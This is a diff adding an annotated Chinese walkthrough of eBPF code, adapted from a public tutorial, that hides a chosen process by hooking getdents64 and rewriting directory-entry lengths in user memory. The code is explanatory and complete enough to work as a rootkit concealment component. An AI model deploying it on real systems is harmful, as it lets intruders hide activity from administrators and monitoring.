@@ -40,7 +40,7 @@ tags:
 int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 ```
 
-这里要了解，参数 `dirp` 并不是仅仅指向一个 `linux_dirent64` 结构，而是一个 index 数组链表，一个用于存储目录项 dentry 信息的缓冲区
+这里要了解，参数 `dirp` 并不是仅仅指向一个 `linux_dirent64` 结构，而是一个 index 数组链表，一个用于存储（保存）目录项 dentry 信息的缓冲区，注意这个`dirp`是一个`linux_dirent64`型的顺序数组的首地址
 
 其中，`struct linux_dirent64`（目录项）的定义如下，结构体包含了目录项的各种属性，如文件名、文件类型、inode 号等
 
@@ -59,10 +59,11 @@ struct linux_dirent64 {
 
 ![dirent](https://github.com/pandaychen/pandaychen.github.io/blob/master/blog_img/ebpf/dev/hidepid/ebpf-hide-pid-1.png?raw=true)
 
+本文分析的内核态代码参考[eunomia-bpf](https://github.com/eunomia-bpf/bpf-developer-tutorial/blob/main/src/24-hide/pidhide.bpf.c)的实现
+
 ####    MAPS 定义
 
 ```CPP
-// SPDX-License-Identifier: BSD-3-Clause
 #include "vmlinux.h"
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
@@ -111,11 +112,255 @@ struct {
 } map_prog_array SEC(".maps");
 ```
 
+各个MAPS的用途如下：
+
+| MAPS变量 | 类型 |size| 作用 |
+| :-----:| :----: | :----: |:----: |
+| `map_buffs` | `BPF_MAP_TYPE_HASH`| `8192` | KEY：进程id，VALUE：存储目录项（`struct linux_dirent64`）的缓冲区地址 |
+| `map_bytes_read` | `BPF_MAP_TYPE_HASH` |`8192`| 用于在数据循环中启用搜索 |
+|`map_to_patch`|`BPF_MAP_TYPE_HASH` | `8192`| 存储了需要被修改的目录项的地址 | 
+|`map_prog_array`|`BPF_MAP_TYPE_PROG_ARRAY`| `5`| 用于尾调用数组的注册，保存程序的尾部调用|
+
 ####    内核态实现
+以tracepoint为例，需要实现的hook点如下：
+-   `tracepoint:syscalls:sys_enter_getdents64`：
+-   `tracepoint:syscalls:sys_exit_getdents64`：在 `getdents64` 系统调用返回时被调用
+
+1、`sys_enter_getdents64`
+
+```CPP
+SEC("tp/syscalls/sys_enter_getdents64")
+int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
+{
+    size_t pid_tgid = bpf_get_current_pid_tgid();
+    // Check if we're a process thread of interest
+    // if target_ppid is 0 then we target all pids
+    if (target_ppid != 0)       //target_ppid为检测条件，为0时则检测所有调用getdents64的进程
+    {
+        struct task_struct *task = (struct task_struct *)bpf_get_current_task(); 
+        int ppid = BPF_CORE_READ(task, real_parent, tgid);  // 获取正在调用getdents64系统调用的某个程序的ppid
+        if (ppid != target_ppid)
+        {
+            return 0;
+        }
+    }
+    int pid = pid_tgid >> 32;   //获取进程id
+    unsigned int fd = ctx->args[0];
+    unsigned int buff_count = ctx->args[2];
+
+    // Store params in map for exit function
+    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
+
+    //存储啥进程调用了getdents64函数，并且返回记录的地址是什么
+    bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);
+
+    return 0;
+}
+```
+
+2、`sys_exit_getdents64`，核心逻辑如下：
+
+-   循环来迭代读取目录的内容，检查当前的dentry的name是否匹配到待隐藏的目录名字
+-   设置最大循环次数，在这个循环次数内，如果搜索到，则通过tail call跳转到`handle_getdents_patch`处理
+-   如果在有限次数中未搜索到，则使用tail call的方式跳转回`handle_getdents_exit`继续本流程（因为verifier的限制不可以无限循环），但是需要保存当前已经读取到的`dirp`指针的偏移`bpos`（理解这里很重要）
+-   除此之外，由于隐藏进程目录需要知道该目录的前一个`struct linux_dirent64`的地址，所以每遍历一个都要保存前一个目录项的地址`dirp`，保存在`map_to_patch`中
+
+```CPP
+SEC("tp/syscalls/sys_exit_getdents64")
+int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
+{
+    size_t pid_tgid = bpf_get_current_pid_tgid();
+    int total_bytes_read = ctx->ret;        //getdents64的返回值
+    // if bytes_read is 0, everything's been read
+    if (total_bytes_read <= 0)
+    {
+        //如果没有读取到内容（getdents64返回值<=0），就直接返回
+        return 0;
+    }
+
+    // Check we stored the address of the buffer from the syscall entry
+    //从 map_buffs 这个 map 中获取 getdents64 系统调用入口处保存的目录内容的地址
+    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
+    if (pbuff_addr == 0)
+    {
+        // 如果没有存储过，那么也直接返回，不处理
+        return 0;
+    }
+
+    // All of this is quite complex, but basically boils down to
+    // Calling 'handle_getdents_exit' in a loop to iterate over the file listing
+    // in chunks of 200, and seeing if a folder with the name of our pid is in there.
+    // If we find it, use 'bpf_tail_call' to jump to handle_getdents_patch to do the actual
+    // patching
+    long unsigned int buff_addr = *pbuff_addr;
+    struct linux_dirent64 *dirp = 0;
+    int pid = pid_tgid >> 32;
+    short unsigned int d_reclen = 0;
+    char filename[MAX_PID_LEN];
+
+    //接下来的核心逻辑，就是在dirp指向的内存空间中遍历及搜索，找到命中条件的struct linux_dirent64结构
+
+    unsigned int bpos = 0;
+    // 查找对pid
+    unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
+    if (pBPOS != 0)
+    {
+        bpos = *pBPOS;
+    }
+
+    //采用分块处理（每次200条目）是为了绕过内核的指令数限制
+    for (int i = 0; i < 200; i++)
+    {
+        if (bpos >= total_bytes_read)
+        {
+            // 已经读完了，跳出
+            break;
+        }
+
+        //根据切割的linux_dirent64结构进行遍历
+        dirp = (struct linux_dirent64 *)(buff_addr + bpos);
+
+        // 从内核空间读到用户空间
+        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
+        bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);  //进程id为目录名
+
+        int j = 0;
+        for (j = 0; j < pid_to_hide_len; j++)
+        {
+            if (filename[j] != pid_to_hide[j])
+            {
+                break;
+            }
+        }
+        if (j == pid_to_hide_len)
+        {
+            // ***********
+            // We've found the folder!!!
+            // Jump to handle_getdents_patch so we can remove it!
+            // ***********
+            // 找到了需要隐藏的目录，那么使用尾调用的方法进行屏蔽处理，不会再跳转回来
+            bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
+            bpf_map_delete_elem(&map_buffs, &pid_tgid);
+            bpf_tail_call(ctx, &map_prog_array, PROG_02);
+        }
+
+        //当前的linux_dirent64不匹配，需要保存dirp这个地址，为什么呢？
+        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
+        bpos += d_reclen;
+    }
+
+    // If we didn't find it, but there's still more to read,
+    // jump back the start of this function and keep looking
+    // 说明还没有读完
+    if (bpos < total_bytes_read)
+    {
+        //保存当前已读的偏移，下次继续读
+        bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
+        bpf_tail_call(ctx, &map_prog_array, PROG_01);
+    }
+
+    //已经处理完了，删除map
+    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
+    bpf_map_delete_elem(&map_buffs, &pid_tgid);
+
+    return 0;
+}
+```
+
+3、处理需要被隐藏的进程目录`handle_getdents_patch`实现如下
+
+-   隐藏的方式：读取待隐藏的目录项的前一个目录的指针，并且修改其 `d_reclen` 字段，让它覆盖下一个目录项，这样就可以隐藏目标进程（目录）了，核心代码`bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new))`
+-   使用了 `bpf_probe_read_user`、`bpf_probe_read_user_str`、`bpf_probe_write_user` 这几个函数来读取和写入用户空间的数据。因为在内核空间不能直接访问用户空间的数据，必须使用helper提供的函数
+-   覆盖逻辑见图，比较清晰了
+
+```CPP
+SEC("tp/syscalls/sys_exit_getdents64")
+int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
+{
+    // Only patch if we've already checked and found our pid's folder to hide
+    size_t pid_tgid = bpf_get_current_pid_tgid();
+    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
+    if (pbuff_addr == 0) {
+        // 校验前一个dentry是否存在
+        return 0;
+    }
+
+    // Unlink target, by reading in previous linux_dirent64 struct,
+    // and setting it's d_reclen to cover itself and our target.
+    // This will make the program skip over our folder.
+    long unsigned int buff_addr = *pbuff_addr;
+    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buff_addr;
+    short unsigned int d_reclen_previous = 0;
+    bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);
+
+    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr+d_reclen_previous);
+    short unsigned int d_reclen = 0;
+    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
+
+    // Debug print
+    char filename[MAX_PID_LEN];
+    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp_previous->d_name);
+    filename[pid_to_hide_len-1] = 0x00;
+    bpf_printk("[PID_HIDE] filename previous %s\n", filename);
+    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);
+    filename[pid_to_hide_len-1] = 0x00;
+    bpf_printk("[PID_HIDE] filename next one %s\n", filename);
+
+    // Attempt to overwrite
+    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
+    long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));
+
+    // Send an event
+    struct event *e;
+    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
+    if (e) {
+        e->success = (ret == 0);
+        e->pid = (pid_tgid >> 32);
+        bpf_get_current_comm(&e->comm, sizeof(e->comm));
+        bpf_ringbuf_submit(e, 0);
+    }
+
+    bpf_map_delete_elem(&map_to_patch, &pid_tgid);
+    return 0;
+}
+```
 
 
 ####    用户态实现
+这里主要列举一下tail_call的注册：
+
+```CPP
+int main(){
+    //...
+    // Setup Maps for tail calls
+    int index = PROG_01;
+    int prog_fd = bpf_program__fd(skel->progs.handle_getdents_exit);
+    int ret = bpf_map_update_elem(
+        bpf_map__fd(skel->maps.map_prog_array),
+        &index,
+        &prog_fd,
+        BPF_ANY);
+    if (ret == -1)
+    {
+        printf("Failed to add program to prog array! %s\n", strerror(errno));
+        goto cleanup;
+    }
+    index = PROG_02;
+    prog_fd = bpf_program__fd(skel->progs.handle_getdents_patch);
+    ret = bpf_map_update_elem(
+        bpf_map__fd(skel->maps.map_prog_array),
+        &index,
+        &prog_fd,
+        BPF_ANY);
+    if (ret == -1)
+    {
+        printf("Failed to add program to prog array! %s\n", strerror(errno));
+        goto cleanup;
+    }
+    //...
+}
+```
 
 ##  0x03  参考
--   [eBPF 开发实践：使用 eBPF 隐藏进程或文件信息](https://eunomia.dev/zh/tutorials/24-hide/)
+-   [eBPF 开发实践：使用 eBPF 隐藏进程或文件信息](https://eunomia.dev/zh/tutorials/24-hide/) 你 、
 -   [sudoadd](https://github.com/eunomia-bpf/bpf-developer-tutorial/blob/main/src/26-sudo/sudoadd.bpf.c)
